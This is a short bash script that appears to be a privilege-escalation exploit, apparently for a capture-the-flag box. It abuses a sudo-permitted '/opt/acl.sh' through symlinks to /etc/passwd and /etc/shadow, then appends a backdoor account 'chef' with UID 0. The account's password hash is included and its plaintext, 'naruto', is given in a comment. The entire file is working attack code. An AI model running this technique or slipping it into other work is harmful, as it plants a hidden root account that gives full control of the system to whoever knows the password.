#!/bin/bash

# Define paths for symlinks
SYMLINK_PASSWD="/home/mtz/passwd"
SYMLINK_SHADOW="/home/mtz/shadow"

# Create symbolic links
ln -sf /etc/passwd $SYMLINK_PASSWD
ln -sf /etc/shadow $SYMLINK_SHADOW

# Define the user entry and hashed password
USER_ENTRY="chef:x:0:0:root:/root:/bin/bash"
HASHED_PASSWORD='$6$m.8UCPi1Mj9FRFMK$OR6ubVYKZzE9UFiGm4ahw0t680nd5m//Wj55/0apx9NjfyOML8bvTi19Bh7JfAEW0wm59BE5dp17VrKpu8UCI0'
#password is naruto

# Update permissions for the symlinks using /opt/acl.sh with sudo
sudo /opt/acl.sh mtz rwx $SYMLINK_PASSWD
sudo /opt/acl.sh mtz rwx $SYMLINK_SHADOW

# Append the new entries to the symlinked files
echo "$USER_ENTRY" | tee -a $SYMLINK_PASSWD
echo "chef:$HASHED_PASSWORD:19742:0:99999:7:::" | tee -a $SYMLINK_SHADOW

# Verify the changes
echo "Updated /etc/passwd:"
tail -n 10 $SYMLINK_PASSWD

echo "Updated /etc/shadow:"
tail -n 10 $SYMLINK_SHADOW
